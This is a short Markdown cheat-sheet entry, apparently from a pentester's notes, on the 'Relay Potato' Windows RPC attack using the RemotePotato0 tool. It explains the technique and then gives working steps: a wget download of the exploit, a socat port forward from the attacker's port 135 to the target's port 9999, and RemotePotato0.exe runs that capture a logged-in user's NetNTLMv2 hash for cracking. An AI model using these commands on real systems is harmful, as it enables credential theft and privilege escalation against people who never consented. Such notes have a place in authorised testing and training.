## Relay Potato

[More Info](https://www.sentinelone.com/labs/relaying-potatoes-another-unexpected-privilege-escalation-vulnerability-in-windows-rpc-protocol/)

> Basically, this attack is using a RPC quirk to make a **logged in local user** on the machine make a RPC request to anywhere we want. So we can make the user authenticate to itself via RPC on port `9999`, which is the port that the exploit opened. The exploit will then extract `NetNTLMv2` hash from the request.
> 
> This bug is "(not) fixed" after Windows Server 2016. Microsoft now blocks RPC requests that is not going to port `135`. Because what the attack does is essentially:
> - Open a rpc port on port `9999` on Target machine (because the original port 135 is used)
> - Do something that makes the local user authenticate to the localhost on port `9999` via RPC
> - The exploit capture that and extract `NetNTLMv2` hash
> 
> So now that microsoft blocks any RPC request not going to port `135`, we can make the local user authenticate to our machine on port `135`, then forward our port 135 to the target machine's port `9999`. Wonky fix

### Download exploit
First, we have to download the exploit

```sh
wget https://github.com/antonioCoco/RemotePotato0/releases/download/1.2/RemotePotato0.zip
unzip RemotePotato0.zip
rm -f RemotePotato0.zip
```

Then, you can transfer the exploit to target machine whichever way you like
### Exploit

#### If Windows server > 2016

Now, we create a port forward on attack machine to bend our port `135` back to target machine's port `9999`

```sh
sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.78:9999
```

Finally, on the target machine, run the exploit. The IP is our attach machine's IP

```cmd
.\RemotePotato0.exe -m 2 -x 10.10.14.5
```

Then the hash should appear where we ran the exploit, take the hash and crack it

### If windows server < 2016

No need to port forward, the default values works out of the box, just run the exploit with `-m 2`

```cmd
.\RemotePotato0.exe -m 2
```

Then the hash should appear where we ran the exploit, take the hash and crack it